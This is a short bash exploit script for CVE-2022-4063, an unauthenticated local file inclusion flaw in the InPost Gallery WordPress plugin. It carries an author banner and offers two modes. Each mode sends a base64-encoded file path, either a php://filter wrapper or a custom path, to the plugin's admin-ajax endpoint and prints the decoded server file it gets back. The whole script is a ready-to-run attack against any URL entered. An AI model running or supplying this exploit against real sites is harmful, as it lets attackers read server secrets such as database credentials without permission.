#!/bin/bash
# CVE-2022-4063 - InPost Gallery < 2.1.4.1 - Unauthenticated LFI to RCE
# Created By Im-Hanzou
# Single Exploiter

cyan='\033[0;36m'
cat << "EOF"
_____________   __________ _________              
____  _/___  | / /___  __ \__  ____/_____ ________
 __  /  __   |/ / __  /_/ /_  / __  _  _ \__  ___/
__/ /   _  /|  /  _  ____/ / /_/ /  /  __/_  /    
/___/   /_/ |_/   /_/      \____/   \___/ /_/     
                                                  
EOF
printf "CVE-2022-4063 Single Exploiter\n\n"
printf "${cyan}Created By Im-Hanzou
Github : im-hanzou\n\n"

echo "Select Mode:"
echo "1. LFI [php://filter base64]"
echo "2. Custom LFI Payload"
read -p "Choose: " mode

if [ $mode -eq 1 ]; then
    read -p "Target URL: " url
    read -p "Payload: " payload_input
    payload=$(echo -n "{\"pagepath\": \"php://filter/convert.base64-encode/resource=$payload_input\"}" | base64 -w0)
    bang=$(curl -s --insecure "$url/wp-admin/admin-ajax.php?action=inpost_gallery_get_gallery&popup_shortcode_key=inpost_fancy&popup_shortcode_attributes=$payload" | base64 -d)
	echo $bang
elif [ $mode -eq 2 ]; then
    read -p "Target URL: " url
    read -p "Payload: " payload_input
    payload=$(echo -n "{\"pagepath\": \"$payload_input\"}" | base64 -w0)
    bang=$(curl -s --insecure "$url/wp-admin/admin-ajax.php?action=inpost_gallery_get_gallery&popup_shortcode_key=inpost_fancy&popup_shortcode_attributes=$payload" | base64 -d)
	echo $bang
else
    echo "Invalid choice!"
fi
